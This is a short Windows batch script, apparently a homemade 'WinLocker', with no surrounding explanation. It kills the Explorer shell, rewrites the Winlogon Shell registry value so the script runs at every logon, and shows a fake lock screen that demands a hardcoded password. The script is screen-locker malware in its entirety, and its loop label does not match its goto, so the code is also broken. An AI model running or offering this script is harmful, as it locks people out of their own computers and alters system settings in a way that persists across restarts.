@echo off
taskkill /im explorer.exe /f >nul
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "WinLocker.bat" /f
color a


echo Your Windows OC is locked
echo Enter Password:

:ð
set /p x=
if %x%==123321 (echo Windows OC inlocked
start explorer
exit
) else (
echo Error
echo Enter Pass
)
goto h